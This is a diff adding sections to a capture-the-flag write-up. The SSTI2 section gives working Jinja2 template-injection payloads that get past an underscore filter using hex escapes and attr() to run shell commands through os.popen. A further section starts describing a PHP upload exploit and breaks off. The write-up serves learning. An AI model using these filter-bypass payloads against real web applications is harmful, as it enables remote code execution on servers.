@@ -21,6 +21,31 @@
 </details>
 
 <details open>
+<summary>SSTI2</summary>
+  
+Extending the previous exercise, now the machine has sanatized some input, although not all of it. Trying `{{request.application}}` does not work, and we are told to "stop trying to break me". So let's try to break it. 
+
+We'll use `{{request|attr('application')}}`, which succesfully gives us an answer: `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`.
+Trying with `{{request|attr('application')|attr("__globals__")}}` doesn't work, so we'll replace the underscore by its hex value `\x5f`: `{{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")}}` which gives the right information. 
+
+Substituting '__import__' by `\x5f\x5fgetitem\x5f\x5f` we can obtain the rest of attributes. Then, replicating the `ls` command in the previous exercise:
+
+```
+{{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr('popen')('ls')|attr('read')()}}
+```
+Which shows a file `flag`. We can obtain its contents with `cat flag`:
+```
+{{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr('popen')('cat flag')|attr('read')()}}
+```
+</details>
+
+
+
+
+
+
+
+<details open>
 <summary>n0s4n1ty 1</summary>
 
 When entering the machine, we are presented a page where the user can upload a profile picture. First we will try to exploit this by checking if the input is sanitized. Trying to upload some `test.txt` file, and navigating to `/uploads/test.txt` as indicated by the upload page, we see the input is indeed not sanitized, since we are able to upload _any_ type of file. Next, we start trying differet commands in a `php` file:
